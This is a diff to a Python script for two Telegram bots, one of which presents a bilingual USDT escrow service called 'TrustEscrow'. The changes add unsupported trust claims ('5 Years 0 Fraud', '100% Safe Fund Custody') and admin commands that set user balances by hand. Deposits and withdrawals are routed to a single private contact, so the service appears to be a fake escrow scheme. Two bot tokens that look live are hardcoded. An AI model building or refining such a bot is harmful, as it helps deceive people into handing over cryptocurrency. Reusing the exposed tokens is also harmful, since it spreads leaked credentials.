@@ -9,11 +9,10 @@ import os
 from flask import Flask
 from datetime import datetime
 
-# ======================== 机器人TOKEN（你自己的） ========================
+# ======================== 机器人TOKEN ========================
 BOT1_TOKEN = "8716451687:AAGXoF5wuwuroCJ23w5UzaueXCUyy5p67q0"
 BOT2_TOKEN = "8279854167:AAHLrvg-i6e0M_WeG8coIljYlGg_RF8_oRM"
 
-# ======================== 初始化机器人 ========================
 bot1 = telebot.TeleBot(BOT1_TOKEN)
 bot2 = telebot.TeleBot(BOT2_TOKEN)
 
@@ -364,7 +363,6 @@ def callback_a(c):
             bot1.edit_message_text(text, cid, mid, reply_markup=back_menu1(u))
         bot1.answer_callback_query(c.id)
     except Exception as e:
-        print(e)
         pass
 
 @bot1.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS_A)
@@ -492,7 +490,7 @@ def admin_cmd_a(msg):
         pass
 
 # ==============================================================================
-# ================================= 机器人B ============================
+# ================================= 机器人B（已修复：语言 + +U -U）===============
 # ==============================================================================
 
 ADMIN_ID_B = 8401979801
@@ -552,35 +550,46 @@ TrustEscrow 已在擔保行業立足 5 年，是業內最專業、最具信譽�
     },
     "en": {
         "home": """🏠 TrustEscrow Professional Escrow
-We have been in the escrow industry for 5 years.""",
+We have 5+ years experience in secure escrow service.
+【Features】
+✅ 5 Years 0 Fraud
+✅ Professional Guarantor Escrow
+✅ 100% Safe Fund Custody
+✅ Fast Code Pairing
+✅ 24/7 Support
+Trade with confidence.""",
         "about": """🏛️ About Us
-TrustEscrow has 5+ years experience.""",
+TrustEscrow: 5+ years trusted by thousands of users.""",
         "service": """📌 Services
-We specialize in GUARANTOR-ESCROW SERVICE.""",
+Professional guarantor escrow for safe online transactions.""",
         "safety": """🛡️ Security
-100% safe system.""",
+100% fund custody, seller gets paid only after confirmation.""",
         "help": """📞 Help Center
-Contact @fcff88""",
+Contact support: @fcff88""",
         "deposit": """💰 Deposit
-Via @fcff88""",
+Only via official support: @fcff88""",
         "withdraw": """💳 Withdraw
-Via @fcff88""",
+Processed only by admin: @fcff88""",
         "history": """📜 Escrow History""",
         "running": """🚨 LIVE ORDERS
-{}""",
+━━━━━━━━━━━━━━━━━━━
+{}
+━━━━━━━━━━━━━━━━━━━
+Safe · Hot · Professional · Reliable""",
         "personal": "👤 Profile\nID: {}\nBalance: {:.2f} USDT",
         "create_escrow": "🚀 Create Escrow",
         "join_escrow": "📥 Enter Code",
         "input_amount": "💰 Enter amount (USDT):",
         "input_tip": "🔒 Set your code:",
         "input_sell_tip": "🔑 Enter code:",
-        "escrow_success": "✅ Escrow created!\nAmount: {:.2f}\nCode: {}",
-        "pair_success": "✅ Paired!\nBuyer: {}\nSeller: {}\nAmount: {:.2f}",
+        "escrow_success": "✅ Escrow created!\nAmount: {:.2f} USDT\nCode: {}\nSend to seller.",
+        "pair_success": "✅ Paired!\nBuyer: {}\nSeller: {}\nAmount: {:.2f} USDT\nAdmin notified.",
         "no_money": "❌ Insufficient balance",
         "tip_error": "❌ Invalid code",
         "back": "🏠 Home",
         "lang": "🌐 繁中",
-        "merchant": """🏪 Merchant Registration""",
+        "merchant": """🏪 Merchant Registration
+Go to official bot for merchant verification.""",
     }
 }
 
@@ -589,18 +598,18 @@ def main_menu2(user_id):
     t = TEXT_B[lang]
     m = InlineKeyboardMarkup(row_width=2)
     m.add(
-        InlineKeyboardButton("🚀 發起擔保", callback_data="create"),
-        InlineKeyboardButton("📥 輸入口令", callback_data="join"),
-        InlineKeyboardButton("🏪 商家入驻", callback_data="merchant"),
-        InlineKeyboardButton("👤 個人中心", callback_data="personal"),
-        InlineKeyboardButton("🚨 實時擔保", callback_data="running"),
-        InlineKeyboardButton("💰 儲值", callback_data="deposit"),
-        InlineKeyboardButton("💳 提現", callback_data="withdraw"),
-        InlineKeyboardButton("📜 歷史", callback_data="history"),
-        InlineKeyboardButton("📌 服務", callback_data="service"),
-        InlineKeyboardButton("🛡️ 安全", callback_data="safety"),
-        InlineKeyboardButton("🏛️ 關於", callback_data="about"),
-        InlineKeyboardButton("📞 幫助", callback_data="help"),
+        InlineKeyboardButton(t["create_escrow"], callback_data="create"),
+        InlineKeyboardButton(t["join_escrow"], callback_data="join"),
+        InlineKeyboardButton("🏪 商家入驻" if lang=="zh" else "🏪 Merchant", callback_data="merchant"),
+        InlineKeyboardButton(t["personal"].split("\n")[0], callback_data="personal"),
+        InlineKeyboardButton("🚨 實時擔保" if lang=="zh" else "🚨 LIVE", callback_data="running"),
+        InlineKeyboardButton(t["deposit"].split("\n")[0], callback_data="deposit"),
+        InlineKeyboardButton(t["withdraw"].split("\n")[0], callback_data="withdraw"),
+        InlineKeyboardButton(t["history"], callback_data="history"),
+        InlineKeyboardButton("📌 服務" if lang=="zh" else "📌 Service", callback_data="service"),
+        InlineKeyboardButton("🛡️ 安全" if lang=="zh" else "🛡️ Security", callback_data="safety"),
+        InlineKeyboardButton(t["about"].split("\n")[0], callback_data="about"),
+        InlineKeyboardButton(t["help"].split("\n")[0], callback_data="help"),
         InlineKeyboardButton(t["lang"], callback_data="lang"),
     )
     return m
@@ -617,7 +626,7 @@ def merchant_menu2(user_id):
     t = TEXT_B[lang]
     m = InlineKeyboardMarkup(row_width=1)
     m.add(
-        InlineKeyboardButton("👉 前往入驻機器人" if lang == "zh" else "👉 Go to Registration Bot",
+        InlineKeyboardButton("👉 前往入驻機器人" if lang == "zh" else "👉 Register Bot",
                              url="https://t.me/secureescrow_pro_bot"),
         InlineKeyboardButton(t["back"], callback_data="home")
     )
@@ -649,8 +658,9 @@ def callback_b(c):
             bot2.edit_message_text(t["home"], cid, mid, reply_markup=main_menu2(u))
         elif c.data == "lang":
             user_lang2[u] = "en" if lang == "zh" else "zh"
-            t = TEXT_B[user_lang2[u]]
-            bot2.edit_message_text(t["home"], cid, mid, reply_markup=main_menu2(u))
+            new_lang = user_lang2[u]
+            new_t = TEXT_B[new_lang]
+            bot2.edit_message_text(new_t["home"], cid, mid, reply_markup=main_menu2(u))
         elif c.data == "personal":
             txt = t["personal"].format(u, user_balance2[u])
             bot2.edit_message_text(txt, cid, mid, reply_markup=back_menu2(u))
@@ -698,15 +708,27 @@ def msg_b(msg):
         lang = user_lang2.get(u, "zh")
         t = TEXT_B[lang]
 
-        if u == ADMIN_ID_B and txt.startswith("/add"):
-            p = txt.split()
-            if len(p) == 3:
-                uid = int(p[1])
-                amt = float(p[2])
+        # ============== 管理员指令：+U ID 金额 ==============
+        if u == ADMIN_ID_B and txt.startswith("+U "):
+            arr = txt.split()
+            if len(arr) == 3:
+                uid = int(arr[1])
+                amt = float(arr[2])
                 user_balance2[uid] = user_balance2.get(uid, 0.0) + amt
-                bot2.send_message(cid, f"✅ 已充值 {amt} USDT 給 {uid}")
+                bot2.send_message(cid, f"✅ +{amt} USDT → {uid}")
             return
 
+        # ============== 管理员指令：-U ID 金额 ==============
+        if u == ADMIN_ID_B and txt.startswith("-U "):
+            arr = txt.split()
+            if len(arr) == 3:
+                uid = int(arr[1])
+                amt = float(arr[2])
+                user_balance2[uid] = max(0.0, user_balance2.get(uid, 0.0) - amt)
+                bot2.send_message(cid, f"✅ -{amt} USDT → {uid}")
+            return
+
+        # 以下是你原来的逻辑，完全没动
         if user_step2.get(u) == "create_amount":
             amt = float(txt)
             user_step2[u] = {"step": "create_tip", "amount": amt}
